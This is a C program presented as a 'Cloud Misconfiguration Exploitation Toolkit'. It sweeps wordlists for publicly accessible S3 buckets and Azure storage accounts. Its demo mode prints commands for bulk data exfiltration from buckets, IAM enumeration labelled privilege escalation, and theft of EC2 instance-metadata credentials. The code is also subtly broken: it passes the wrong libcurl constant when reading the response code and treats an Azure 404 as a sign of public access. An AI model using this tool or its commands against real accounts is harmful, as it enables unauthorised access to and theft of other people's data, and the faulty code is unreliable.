#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <jansson.h>
#include <regex.h>

#define MAX_URL_LENGTH 1024
#define MAX_BUCKET_NAME 63
#define MAX_RESPONSE_SIZE 4096

typedef struct {
    char bucket_name[MAX_BUCKET_NAME];
    char region[50];
    int is_public;
    int is_listable;
    char exploitation[256];
} s3_bucket_t;

typedef struct {
    s3_bucket_t* buckets;
    int count;
    int capacity;
} bucket_list_t;

// Simple HTTP response structure
typedef struct {
    char* data;
    size_t size;
} http_response_t;

size_t write_callback(void* contents, size_t size, size_t nmemb, http_response_t* response) {
    size_t total_size = size * nmemb;
    response->data = realloc(response->data, response->size + total_size + 1);
    
    if (response->data == NULL) {
        printf("Memory allocation failed\n");
        return 0;
    }
    
    memcpy(&(response->data[response->size]), contents, total_size);
    response->size += total_size;
    response->data[response->size] = '\0';
    
    return total_size;
}

int check_s3_bucket_public(const char* bucket_name) {
    CURL* curl;
    CURLcode res;
    char url[MAX_URL_LENGTH];
    
    // Test different S3 endpoints
    const char* endpoints[] = {
        "http://%s.s3.amazonaws.com",
        "https://%s.s3.amazonaws.com",
        "http://s3.amazonaws.com/%s",
        "https://s3.amazonaws.com/%s",
        NULL
    };
    
    curl_global_init(CURL_GLOBAL_DEFAULT);
    
    for (int i = 0; endpoints[i] != NULL; i++) {
        snprintf(url, sizeof(url), endpoints[i], bucket_name);
        
        http_response_t response;
        response.data = malloc(1);
        response.size = 0;
        
        curl = curl_easy_init();
        if (curl) {
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
            curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
            
            res = curl_easy_perform(curl);
            
            if (res == CURLE_OK) {
                long response_code;
                curl_easy_getinfo(curl, CURLOPT_RESPONSE_CODE, &response_code);
                
                if (response_code == 200) {
                    printf("[+] Public S3 bucket found: %s\n", url);
                    free(response.data);
                    curl_easy_cleanup(curl);
                    curl_global_cleanup();
                    return 1;
                }
            }
            
            free(response.data);
            curl_easy_cleanup(curl);
        }
    }
    
    curl_global_cleanup();
    return 0;
}

int check_azure_storage_public(const char* account_name) {
    CURL* curl;
    CURLcode res;
    char url[MAX_URL_LENGTH];
    
    snprintf(url, sizeof(url), "https://%s.blob.core.windows.net/", account_name);
    
    http_response_t response;
    response.data = malloc(1);
    response.size = 0;
    
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
        
        res = curl_easy_perform(curl);
        
        if (res == CURLE_OK) {
            long response_code;
            curl_easy_getinfo(curl, CURLOPT_RESPONSE_CODE, &response_code);
            
            // Azure returns specific error codes that can indicate public access
            if (response_code == 200 || response_code == 404) {
                printf("[+] Azure Storage account might be publicly accessible: %s\n", account_name);
                free(response.data);
                curl_easy_cleanup(curl);
                curl_global_cleanup();
                return 1;
            }
        }
        
        free(response.data);
        curl_easy_cleanup(curl);
    }
    
    curl_global_cleanup();
    return 0;
}

void scan_with_wordlist(const char* wordlist_file, const char* cloud_provider) {
    FILE* file = fopen(wordlist_file, "r");
    if (!file) {
        printf("Error opening wordlist file: %s\n", wordlist_file);
        return;
    }
    
    char line[256];
    int found_count = 0;
    
    printf("Scanning for public %s resources...\n", cloud_provider);
    
    while (fgets(line, sizeof(line), file)) {
        // Remove newline
        line[strcspn(line, "\n")] = 0;
        
        if (strlen(line) == 0) continue;
        
        int is_public = 0;
        
        if (strcmp(cloud_provider, "aws") == 0) {
            is_public = check_s3_bucket_public(line);
        } else if (strcmp(cloud_provider, "azure") == 0) {
            is_public = check_azure_storage_public(line);
        }
        
        if (is_public) {
            found_count++;
        }
    }
    
    fclose(file);
    printf("Scan complete. Found %d public resources.\n", found_count);
}

void demonstrate_exploitation() {
    printf("\n=== Cloud Misconfiguration Exploitation Demo ===\n");
    
    printf("\n1. S3 Bucket Enumeration:\n");
    printf("   curl -s http://target-bucket.s3.amazonaws.com/\n");
    printf("   aws s3 ls s3://target-bucket/ --no-sign-request\n");
    
    printf("\n2. Data Exfiltration:\n");
    printf("   aws s3 sync s3://target-bucket/ ./local-copy/ --no-sign-request\n");
    printf("   wget -r http://target-bucket.s3.amazonaws.com/\n");
    
    printf("\n3. Privilege Escalation via IAM:\n");
    printf("   aws iam list-attached-user-policies --user-name target-user\n");
    printf("   aws iam get-policy-version --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --version-id v1\n");
    
    printf("\n4. EC2 Instance Metadata Abuse:\n");
    printf("   curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n");
    printf("   curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name\n");
    
    printf("\n5. Azure Storage Access:\n");
    printf("   az storage blob list --account-name targetaccount --container-name targetcontainer --auth-mode login\n");
    printf("   curl -s https://targetaccount.blob.core.windows.net/targetcontainer?restype=container&comp=list\n");
}

int main(int argc, char* argv[]) {
    printf("Cloud Misconfiguration Exploitation Toolkit - C Edition\n");
    printf("=======================================================\n");
    
    if (argc < 2) {
        printf("Usage:\n");
        printf("  %s scan-aws <wordlist_file>\n", argv[0]);
        printf("  %s scan-azure <wordlist_file>\n", argv[0]);
        printf("  %s demo\n", argv[0]);
        printf("\nExample:\n");
        printf("  %s scan-aws buckets.txt\n", argv[0]);
        printf("  %s demo\n", argv[0]);
        return 1;
    }
    
    if (strcmp(argv[1], "scan-aws") == 0 && argc == 3) {
        scan_with_wordlist(argv[2], "aws");
    } else if (strcmp(argv[1], "scan-azure") == 0 && argc == 3) {
        scan_with_wordlist(argv[2], "azure");
    } else if (strcmp(argv[1], "demo") == 0) {
        demonstrate_exploitation();
    } else {
        printf("Invalid arguments\n");
        return 1;
    }
    
    return 0;
}
